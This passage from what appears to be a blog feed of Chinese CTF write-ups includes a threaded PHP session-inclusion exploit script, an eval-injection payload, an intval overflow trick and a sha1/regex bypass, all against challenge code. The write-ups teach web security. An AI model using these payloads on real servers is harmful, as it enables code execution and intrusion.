punctuation">:</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            target<span class="token punctuation">,</span>            data<span class="token operator">=</span>data<span class="token punctuation">,</span>            files<span class="token operator">=</span>files<span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> flag<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>e<span class="token punctuation">:</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>            <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>target<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        <span class="token punctuation">)</span>        <span class="token keyword">if</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    futures <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    pool <span class="token operator">=</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>upload<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        futures<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pool<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>write<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">)</span>    wait<span class="token punctuation">(</span>futures<span class="token punctuation">)</span></code></pre><p>访问<code>http://81.70.102.209:10040/?file=/tmp/success</code>得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>session文件包含写shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackergame2021</title>
    <link href="/2021/11/07/hackergame2021/"/>
    <url>/2021/11/07/hackergame2021/</url>
    
    <content type="html"><![CDATA[<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/da0556cc3a06f8bc.png"></p><p><code>unix时间戳</code><br>点next后url会加上<code>page=1</code>,时间就会加一秒</p><p>时间戳网站<code>https://tool.chinaz.com/tools/unixtime.aspx</code></p><p>也可以用二分法</p><pre><code>测试 100000000000，太大 =&gt; (100000000000 + 0) / 2 = 50000000000测试 50000000000，太大 =&gt; (50000000000 + 0) / 2 = 25000000000测试 25000000000，太大 =&gt; (25000000000 + 0) / 2 = 12500000000测试 12500000000，太大 =&gt; (12500000000 + 0) / 2 = 6250000000测试 6250000000，太大 =&gt; (6250000000 + 0) / 2 = 3125000000测试 3125000000，太大 =&gt; (3125000000 + 0) / 2 = 1562500000测试 1562500000，太小（2019 年）=&gt; (1562500000 + 3125000000) / 2 = 2343750000测试 2343750000，太大 =&gt; (1562500000 + 2343750000) / 2 = 1953125000测试 1953125000，太大 =&gt; (1562500000 + 1953125000) / 2 = 1757812500测试 1757812500，太大（2025 年）=&gt; (1562500000 + 1757812500) / 2 = 1660156250测试 1660156250，太大（2022 年）=&gt; (1562500000 + 1660156250) / 2 = 1611328125测试 1611328125，太小（2021 年 1 月）=&gt; (1611328125 + 1660156250) / 2 = 1635742187测试 1635742187，太大（2021 年 11 月）=&gt; (1611328125 + 1635742187) / 2 = 1623535156测试 1623535156，太小（2021 年 6 月）=&gt; (1623535156 + 1635742187) / 2 = 1629638671测试 1629638671，太小（2021 年 8 月）=&gt; (1629638671 + 1635742187) / 2 = 1632690429测试 1632690429，太小（2021 年 9 月）=&gt; (1632690429 + 1635742187) / 2 = 1634216308测试 1634216308，太小（2021 年 10 月 14 日）=&gt; (1634216308 + 1635742187) / 2 = 16349792471634979247 得到答案（2021-10-23 16:54:07 +08:00）</code></pre><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p><img src="https://i.bmp.ovh/imgs/2021/11/8d62245630118b5c.png"><br>显然，69是组合不出20的</p><p>需要猜测源码，<code>intval</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">check_last_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bottle_6</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b6'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$bottle_9</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b9'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$bottle_6</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token variable">$bottle_9</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'操作无效：不能放负数个瓜。点击&lt;a href="/">这里&lt;/a>回到主页。'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pool'</span><span class="token punctuation">]</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$bottle_6</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token variable">$bottle_9</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>整数溢出会变为float,然后再用intval后，就会变成负数</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">;</span>   <span class="token comment">//9223372036854775807</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token number">9223372036854775807</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token number">9223372036854775808</span><span class="token punctuation">;</span><span class="token variable">$ia</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ib</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//int(9223372036854775807)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//float(9.2233720368548E+18)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ia</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// int(9223372036854775807)</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ib</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//int(-9223372036854775808)</span></code></pre><pre><code>1024819115206086200 * 9 = 92233720368547758001024819115206086201 * 9 = 9223372036854775809</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086201</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-9223372036854775808)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086200</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-8)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(1)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086201</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-9223372036854775807)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">1024819115206086200</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(-7)</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">;</span><span class="token variable">$ib</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// int(20)</span></code></pre><p>操作六次</p><pre><code>1024819115206086201 * 91024819115206086200 * 91 * 91024819115206086201 * 91024819115206086200 * 93 * 9</code></pre><p>其他两道<br>一道GraphQL，还有一道js逆向分析，不懂<br><a href="https://github.com/USTC-Hackergame/hackergame2021-writeups">https://github.com/USTC-Hackergame/hackergame2021-writeups</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DAS X 吉林工师</title>
    <link href="/2021/10/29/DAS/"/>
    <url>/2021/10/29/DAS/</url>
    
    <content type="html"><![CDATA[<h2 id="迷路的魔法少女"><a href="#迷路的魔法少女" class="headerlink" title="迷路的魔法少女"></a>迷路的魔法少女</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"\$array = <span class="token interpolation"><span class="token variable">$data</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$attrvalue</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'array('</span><span class="token punctuation">;</span>        <span class="token variable">$attrids</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$attrids</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$attrid</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"=>'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">.</span><span class="token variable">$attrvalue</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'"'</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$attrids</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">','</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$attrstr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token single-quoted-string string">');'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">String2Array</span><span class="token punctuation">(</span><span class="token variable">$attrstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>突破点在<code>attrvalue</code>上</p><p>payload：<code>?attrid[]=&amp;attrvalue[]=1&quot;,11=&gt;phpinfo(),&quot;11&quot;=&gt;&quot;2</code></p><p>flag在<code>phpinfo()</code>中</p><p>通过闭合双引号让<code>eval</code>执行命令</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>鹤城杯</title>
    <link href="/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/"/>
    <url>/2021/10/10/%E9%B9%A4%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="middle-magic"><a href="#middle-magic" class="headerlink" title="middle_magic"></a>middle_magic</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token double-quoted-string string">"./result.php"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^(.*)level(.*)$/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'$&#123;1&#125;&lt;!-- filtered -->$&#123;2&#125;'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/pass_the_level_1#/'</span><span class="token punctuation">,</span> <span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 2"</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>The level 2 can not pass!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token comment">// START FORM PROCESSING    </span>                <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'admin'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'root_pwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is level 3,do you kown how to overcome it?"</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$level_3</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'level_3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$level_3</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">result</span> <span class="token operator">==</span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success:"</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you never beat me!"</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"out"</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token comment">// perform validations on the form data</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;p>out!&lt;/p>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>                <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'nonono!'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;hr>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>payload:</p><pre><code>?aaa=%0apass_the_level_1%23admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:true&#125;</code></pre><h2 id="EasyP"><a href="#EasyP" class="headerlink" title="EasyP"></a>EasyP</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Congratulations! The flag is: '</span> <span class="token punctuation">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Wrong.'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Can you guess it?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>If your guess is correct, I'll give you the flag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Source<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$message</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 